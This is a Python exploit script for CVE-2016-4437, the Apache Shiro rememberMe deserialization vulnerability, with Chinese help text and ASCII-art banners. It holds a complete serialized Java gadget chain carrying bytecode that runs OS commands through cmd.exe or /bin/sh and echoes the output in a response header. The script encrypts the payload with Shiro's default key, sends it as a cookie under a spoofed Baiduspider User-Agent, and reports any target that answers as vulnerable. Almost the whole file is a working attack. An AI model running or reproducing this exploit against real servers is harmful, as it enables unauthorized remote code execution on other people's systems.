import requests
import os
from Crypto.Cipher import AES
import argparse
import base64
from colorama import Fore, Style, init
import requests
import urllib3
urllib3.disable_warnings()
os.environ['http_proxy'] = os.environ['https_proxy'] = 'http://127.0.0.1:8080'
init()
print(r'''CVE-2016-4437
   _______      ________    ___   ___  __   __        _  _   _  _  ____ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ | / /       | || | | || ||___ \____  |
 | |     \ \  / /| |__ ______ ) | | | || |/ /_ ______| || |_| || |_ __) |  / / 
 | |      \ \/ / |  __|______/ /| | | || | '_ \______|__   _|__   _|__ <  / /  
 | |____   \  /  | |____    / /_| |_| || | (_) |        | |    | | ___) |/ /   
  \_____|   \/   |______|  |____|\___/ |_|\___/         |_|    |_||____//_/    
                                                                               
                                                                               

          _   _     _               _     
         (_) | |   | |             | |    
   __ _   _  | |_  | |__    _   _  | |__  
  / _` | | | | __| | '_ \  | | | | | '_ \ 
 | (_| | | | | |_  | | | | | |_| | | |_) |
  \__, | |_|  \__| |_| |_|  \__,_| |_.__/ 
   __/ |                                  
  |___/                                   

https://github.com/xk-mt/CVE-2016-4437

          $$\                              $$\     
          $$ |                             $$ |    
$$\   $$\ $$ |  $$\         $$$$$$\$$$$\ $$$$$$\   
\$$\ $$  |$$ | $$  |$$$$$$\ $$  _$$  _$$\\_$$  _|  
 \$$$$  / $$$$$$  / \______|$$ / $$ / $$ | $$ |    
 $$  $$<  $$  _$$<          $$ | $$ | $$ | $$ |$$\ 
$$  /\$$\ $$ | \$$\         $$ | $$ | $$ | \$$$$  |
\__/  \__|\__|  \__|        \__| \__| \__|  \____/ 

https://github.com/xk-mt/CVE-2016-4437

''')

parser = argparse.ArgumentParser()

# 添加命令行参数
parser = argparse.ArgumentParser(add_help=False)
parser.add_argument('-h', '-help', action='store_true')
parser.add_argument('-k', '-key', default='kPH+bIxk5D2deZiIxcaaaA==')
parser.add_argument('-u', '-url')

args = parser.parse_args()
key = base64.b64decode(args.k)
url = args.u

if args.h or url == None or url[:4] != 'http' or len(key) != 16:
    print('命令执行：xx.py -k')
    print(f"  {'-h':<5}{'-help':<8}显示工具参数信息")
    print(f"  {'-k':<5}{'-key':<8}shiro密钥，必须16个字节的base64，默认密钥【kPH+bIxk5D2deZiIxcaaaA==】")
    print(f"  {'-u':<5}{'-url':<8}漏洞的http链接，一定要包含http")
    print('\nhttps://github.com/xk-mt/CVE-2016-4437')
    exit()

iv = 'github.com/xk-mt'.encode()
payload = b'\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator\xe3\xa1\x88\xeas"\xa4H\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00?org.apache.commons.collections.comparators.ComparableComparator\xfb\xf4\x99%\xb8n\xb17\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x06I\x00\r_indentNumberI\x00\x0e_transletIndex[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xffur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x10\x04\xca\xfe\xba\xbe\x00\x00\x003\x00\xf8\x01\x00\x15x/Test249560841772500\x07\x00\x01\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\x18Test249560841772500.java\x01\x00\twriteBody\x01\x00\x17(Ljava/lang/Object;[B)V\x01\x00\x16java/lang/StringBuffer\x07\x00\t\x01\x00\x06<init>\x01\x00\x03()V\x0c\x00\x0b\x00\x0c\n\x00\n\x00\r\x01\x00\x03$$$\x08\x00\x0f\x01\x00\x06append\x01\x00,(Ljava/lang/String;)Ljava/lang/StringBuffer;\x0c\x00\x11\x00\x12\n\x00\n\x00\x13\x01\x00\x1dorg/apache/shiro/codec/Base64\x07\x00\x15\x01\x00\x0eencodeToString\x01\x00\x16([B)Ljava/lang/String;\x0c\x00\x17\x00\x18\n\x00\x16\x00\x19\x01\x00\x08toString\x01\x00\x14()Ljava/lang/String;\x0c\x00\x1b\x00\x1c\n\x00\n\x00\x1d\x01\x00\x10java/lang/String\x07\x00\x1f\x01\x00\x08getBytes\x01\x00\x04()[B\x0c\x00!\x00"\n\x00 \x00#\x01\x00$org.apache.tomcat.util.buf.ByteChunk\x08\x00%\x01\x00\x0fjava/lang/Class\x07\x00\'\x01\x00\x07forName\x01\x00%(Ljava/lang/String;)Ljava/lang/Class;\x0c\x00)\x00*\n\x00(\x00+\x01\x00\x0bnewInstance\x01\x00\x14()Ljava/lang/Object;\x0c\x00-\x00.\n\x00(\x00/\x01\x00\x08setBytes\x08\x001\x01\x00\x02[B\x07\x003\x01\x00\x11java/lang/Integer\x07\x005\x01\x00\x04TYPE\x01\x00\x11Ljava/lang/Class;\x0c\x007\x008\t\x006\x009\x01\x00\x11getDeclaredMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\x0c\x00;\x00<\n\x00(\x00=\x01\x00\x04(I)V\x0c\x00\x0b\x00?\n\x006\x00@\x01\x00\x18java/lang/reflect/Method\x07\x00B\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00D\x00E\n\x00C\x00F\x01\x00\x08getClass\x01\x00\x13()Ljava/lang/Class;\x0c\x00H\x00I\n\x00\x04\x00J\x01\x00\x07doWrite\x08\x00L\x01\x00\tgetMethod\x0c\x00N\x00<\n\x00(\x00O\x01\x00 java/lang/ClassNotFoundException\x07\x00Q\x01\x00\x13java.nio.ByteBuffer\x08\x00S\x01\x00\x04wrap\x08\x00U\x01\x00\x1fjava/lang/NoSuchMethodException\x07\x00W\x01\x00\x04Code\x01\x00\nExceptions\x01\x00\x13java/lang/Exception\x07\x00[\x01\x00\rStackMapTable\x01\x00\x05getFV\x01\x008(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\x0c\x00`\x00a\n\x00(\x00b\x01\x00\x1ejava/lang/NoSuchFieldException\x07\x00d\x01\x00\rgetSuperclass\x0c\x00f\x00I\n\x00(\x00g\x01\x00\x15(Ljava/lang/String;)V\x0c\x00\x0b\x00i\n\x00e\x00j\x01\x00"java/lang/reflect/AccessibleObject\x07\x00l\x01\x00\rsetAccessible\x01\x00\x04(Z)V\x0c\x00n\x00o\n\x00m\x00p\x01\x00\x17java/lang/reflect/Field\x07\x00r\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00t\x00u\n\x00s\x00v\n\x00\x04\x00\r\x01\x00\x10java/lang/Thread\x07\x00y\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\x0c\x00{\x00|\n\x00z\x00}\x01\x00\x0egetThreadGroup\x01\x00\x19()Ljava/lang/ThreadGroup;\x0c\x00\x7f\x00\x80\n\x00z\x00\x81\x01\x00\x07threads\x08\x00\x83\x0c\x00^\x00_\n\x00\x02\x00\x85\x01\x00\x13[Ljava/lang/Thread;\x07\x00\x87\x01\x00\x07getName\x0c\x00\x89\x00\x1c\n\x00z\x00\x8a\x01\x00\x04exec\x08\x00\x8c\x01\x00\x08contains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\x0c\x00\x8e\x00\x8f\n\x00 \x00\x90\x01\x00\x04http\x08\x00\x92\x01\x00\x06target\x08\x00\x94\x01\x00\x12java/lang/Runnable\x07\x00\x96\x01\x00\x06this$0\x08\x00\x98\x01\x00\x07handler\x08\x00\x9a\x01\x00\x06global\x08\x00\x9c\x01\x00\nprocessors\x08\x00\x9e\x01\x00\x0ejava/util/List\x07\x00\xa0\x01\x00\x04size\x01\x00\x03()I\x0c\x00\xa2\x00\xa3\x0b\x00\xa1\x00\xa4\x01\x00\x15(I)Ljava/lang/Object;\x0c\x00t\x00\xa6\x0b\x00\xa1\x00\xa7\x01\x00\x03req\x08\x00\xa9\x01\x00\x0bgetResponse\x08\x00\xab\x01\x00\tgetHeader\x08\x00\xad\x01\x00\x05techo\x08\x00\xaf\n\x00 \x00j\x01\x00\x07isEmpty\x01\x00\x03()Z\x0c\x00\xb2\x00\xb3\n\x00 \x00\xb4\x01\x00\tsetStatus\x08\x00\xb6\x01\x00\taddHeader\x08\x00\xb8\x01\x00\x01c\x08\x00\xba\x01\x00\x0edecodeToString\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x0c\x00\xbc\x00\xbd\n\x00\x16\x00\xbe\x01\x00\x07os.name\x08\x00\xc0\x01\x00\x10java/lang/System\x07\x00\xc2\x01\x00\x0bgetProperty\x0c\x00\xc4\x00\xbd\n\x00\xc3\x00\xc5\x01\x00\x0btoLowerCase\x0c\x00\xc7\x00\x1c\n\x00 \x00\xc8\x01\x00\x06window\x08\x00\xca\x01\x00\x07cmd.exe\x08\x00\xcc\x01\x00\x02/c\x08\x00\xce\x01\x00\x07/bin/sh\x08\x00\xd0\x01\x00\x02-c\x08\x00\xd2\x01\x00\x11java/util/Scanner\x07\x00\xd4\x01\x00\x18java/lang/ProcessBuilder\x07\x00\xd6\x01\x00\x16([Ljava/lang/String;)V\x0c\x00\x0b\x00\xd8\n\x00\xd7\x00\xd9\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\x0c\x00\xdb\x00\xdc\n\x00\xd7\x00\xdd\x01\x00\x11java/lang/Process\x07\x00\xdf\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x0c\x00\xe1\x00\xe2\n\x00\xe0\x00\xe3\x01\x00\x18(Ljava/io/InputStream;)V\x0c\x00\x0b\x00\xe5\n\x00\xd5\x00\xe6\x01\x00\x02\\A\x08\x00\xe8\x01\x00\x0cuseDelimiter\x01\x00\'(Ljava/lang/String;)Ljava/util/Scanner;\x0c\x00\xea\x00\xeb\n\x00\xd5\x00\xec\x01\x00\x04next\x0c\x00\xee\x00\x1c\n\x00\xd5\x00\xef\x0c\x00\x07\x00\x08\n\x00\x02\x00\xf1\x01\x00\x13[Ljava/lang/String;\x07\x00\xf3\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\xf5\n\x00\xf6\x00\r\x00!\x00\x02\x00\xf6\x00\x00\x00\x00\x00\x03\x00\n\x00\x07\x00\x08\x00\x02\x00Y\x00\x00\x01g\x00\x08\x00\x06\x00\x00\x01!\xbb\x00\nY\xb7\x00\x0e\x12\x10\xb6\x00\x14+\xb8\x00\x1a\xb6\x00\x14\x12\x10\xb6\x00\x14\xb6\x00\x1e\xb6\x00$M\x12&\xb8\x00,:\x04\x19\x04\xb6\x000N\x19\x04\x122\x06\xbd\x00(Y\x03\x124SY\x04\xb2\x00:SY\x05\xb2\x00:S\xb6\x00>-\x06\xbd\x00\x04Y\x03,SY\x04\xbb\x006Y\x03\xb7\x00ASY\x05\xbb\x006Y,\xbe\xb7\x00AS\xb6\x00GW*\xb6\x00K\x12M\x04\xbd\x00(Y\x03\x19\x04S\xb6\x00P*\x04\xbd\x00\x04Y\x03-S\xb6\x00GW\xa7\x00\x95:\x05\x12T\xb8\x00,:\x04\x19\x04\x12V\x04\xbd\x00(Y\x03\x124S\xb6\x00>\x19\x04\x04\xbd\x00\x04Y\x03,S\xb6\x00GN*\xb6\x00K\x12M\x04\xbd\x00(Y\x03\x19\x04S\xb6\x00P*\x04\xbd\x00\x04Y\x03-S\xb6\x00GW\xa7\x00L:\x05\x12T\xb8\x00,:\x04\x19\x04\x12V\x04\xbd\x00(Y\x03\x124S\xb6\x00>\x19\x04\x04\xbd\x00\x04Y\x03,S\xb6\x00GN*\xb6\x00K\x12M\x04\xbd\x00(Y\x03\x19\x04S\xb6\x00P*\x04\xbd\x00\x04Y\x03-S\xb6\x00GW\xa7\x00\x03\xb1\x00\x02\x00\x1f\x00\x8b\x00\x8e\x00R\x00\x1f\x00\x8b\x00\xd7\x00X\x00\x01\x00]\x00\x00\x00$\x00\x03\xff\x00\x8e\x00\x03\x07\x00\x04\x07\x004\x07\x004\x00\x01\x07\x00R\xf7\x00H\x07\x00X\xfd\x00H\x07\x00\x04\x07\x00(\x00Z\x00\x00\x00\x04\x00\x01\x00\\\x00\n\x00^\x00_\x00\x02\x00Y\x00\x00\x00~\x00\x03\x00\x05\x00\x00\x00?\x01M*\xb6\x00KN\xa7\x00\x19-+\xb6\x00cM\xa7\x00\x16\xa7\x00\x00:\x04-\xb6\x00hN\xa7\x00\x03-\x12\x04\xa6\xff\xe7,\x01\xa6\x00\x0c\xbb\x00eY+\xb7\x00k\xbf,\x04\xb6\x00q,*\xb6\x00w\xb0\x00\x01\x00\n\x00\x13\x00\x16\x00e\x00\x01\x00]\x00\x00\x00%\x00\x06\xfd\x00\n\x07\x00s\x07\x00(\x08\xff\x00\x02\x00\x04\x07\x00\x04\x07\x00 \x07\x00s\x07\x00(\x00\x01\x07\x00e\t\x05\r\x00Z\x00\x00\x00\x04\x00\x01\x00\\\x00\x01\x00\x0b\x00\x0c\x00\x02\x00Y\x00\x00\x02\xea\x00\x08\x00\r\x00\x00\x02I*\xb7\x00\xf7\x03<\xb8\x00~\xb6\x00\x82\x12\x84\xb8\x00\x86\xc0\x00\x88M\x03>\x1d,\xbe\xa2\x02.,\x1d2:\x04\x19\x04\x01\xa5\x02\x1d\x19\x04\xb6\x00\x8b:\x05\x19\x05\x12\x8d\xb6\x00\x91\x9a\x00\r\x19\x05\x12\x93\xb6\x00\x91\x9a\x00\x06\xa7\x01\xff\x19\x04\x12\x95\xb8\x00\x86:\x06\x19\x06\xc1\x00\x97\x99\x01\xee\x19\x06\x12\x99\xb8\x00\x86\x12\x9b\xb8\x00\x86\x12\x9d\xb8\x00\x86:\x06\xa7\x00\x0b:\x07\xa7\x01\xd3\xa7\x00\x00\x19\x06\x12\x9f\xb8\x00\x86\xc0\x00\xa1:\x08\x036\t\x15\t\x19\x08\xb9\x00\xa5\x01\x00\xa2\x01\xae\x19\x08\x15\t\xb9\x00\xa8\x02\x00:\n\x19\n\x12\xaa\xb8\x00\x86:\x06\x19\x06\xb6\x00K\x12\xac\x03\xbd\x00(\xb6\x00P\x19\x06\x03\xbd\x00\x04\xb6\x00G:\x0b\x19\x06\xb6\x00K\x12\xae\x04\xbd\x00(Y\x03\x12 S\xb6\x00P\x19\x06\x04\xbd\x00\x04Y\x03\xbb\x00 Y\x12\xb0\xb7\x00\xb1S\xb6\x00G\xc0\x00 :\x05\x19\x05\x01\xa5\x00\x0b\x19\x05\xb6\x00\xb5\x99\x00\x06\xa7\x00c\x19\x0b\xb6\x00K\x12\xb7\x04\xbd\x00(Y\x03\xb2\x00:S\xb6\x00P\x19\x0b\x04\xbd\x00\x04Y\x03\xbb\x006Y\x11\x00\xc8\xb7\x00AS\xb6\x00GW\x19\x0b\xb6\x00K\x12\xb9\x05\xbd\x00(Y\x03\x12 SY\x04\x12 S\xb6\x00P\x19\x0b\x05\xbd\x00\x04Y\x03\xbb\x00 Y\x12\xb0\xb7\x00\xb1SY\x04\x19\x05S\xb6\x00GW\x04<\x19\x06\xb6\x00K\x12\xae\x04\xbd\x00(Y\x03\x12 S\xb6\x00P\x19\x06\x04\xbd\x00\x04Y\x03\xbb\x00 Y\x12\xbb\xb7\x00\xb1S\xb6\x00G\xc0\x00 :\x05\x19\x05\x01\xa5\x00\x0b\x19\x05\xb6\x00\xb5\x99\x00\x06\xa7\x00\x98\x19\x05\xb8\x00\xbf:\x05\x19\x0b\xb6\x00K\x12\xb7\x04\xbd\x00(Y\x03\xb2\x00:S\xb6\x00P\x19\x0b\x04\xbd\x00\x04Y\x03\xbb\x006Y\x11\x00\xc8\xb7\x00AS\xb6\x00GW\x12\xc1\xb8\x00\xc6\xb6\x00\xc9\x12\xcb\xb6\x00\x91\x99\x00\x19\x06\xbd\x00 Y\x03\x12\xcdSY\x04\x12\xcfSY\x05\x19\x05S\xa7\x00\x16\x06\xbd\x00 Y\x03\x12\xd1SY\x04\x12\xd3SY\x05\x19\x05S:\x0c\x19\x0b\xbb\x00\xd5Y\xbb\x00\xd7Y\x19\x0c\xb7\x00\xda\xb6\x00\xde\xb6\x00\xe4\xb7\x00\xe7\x12\xe9\xb6\x00\xed\xb6\x00\xf0\xb6\x00$\xb8\x00\xf2\x04<\x1b\x99\x00\x06\xa7\x00\t\x84\t\x01\xa7\xfeL\x1b\x99\x00\x06\xa7\x00\t\x84\x03\x01\xa7\xfd\xd2\xb1\x00\x01\x00W\x00j\x00m\x00\\\x00\x01\x00]\x00\x00\x00\x87\x00\x13\xff\x00\x17\x00\x04\x07\x00\x02\x01\x07\x00\x88\x01\x00\x00\xfd\x00+\x07\x00z\x07\x00 \x02\xff\x00&\x00\x07\x07\x00\x02\x01\x07\x00\x88\x01\x07\x00z\x07\x00 \x07\x00\x04\x00\x01\x07\x00\\\x04\xff\x00\x02\x00\x07\x07\x00\x02\x01\x07\x00\x88\x01\x07\x00z\x07\x00 \x07\x00\x04\x00\x00\xfe\x00\x0e\x00\x07\x00\xa1\x01\xfd\x00s\x07\x00\x04\x07\x00\x04\x02\xfb\x00_:\x02\xfb\x00WR\x07\x00\xf4)\x06\xf9\x00\x05\xff\x00\x06\x00\x05\x07\x00\x02\x01\x07\x00\x88\x01\x07\x00z\x00\x00\xfa\x00\x05\x00Z\x00\x00\x00\x04\x00\x01\x00\\\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06pt\x00\x01apw\x01\x00xq\x00~\x00\rx\n\n\n\n\n\n\n\n\n\n'
payload = base64.b64encode(iv + AES.new(key, 2, iv).encrypt(payload))

print('正在验证……')

cookie = {"rememberMe": payload.decode()}
header = {"Content-Type": "text/xml","User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","Connection": "close","techo": "06790EC2C8CC4C11AFF1561D3ECB0519"}
r = requests.get(url, headers=header, cookies=cookie, verify=False)
if r.headers['techo'] == '06790EC2C8CC4C11AFF1561D3ECB0519':
    print(Fore.GREEN + f'【+】疑似漏洞：{url}' + Style.RESET_ALL)
else:
    print(Fore.RED + f'【-】验证失败：{url}' + Style.RESET_ALL)
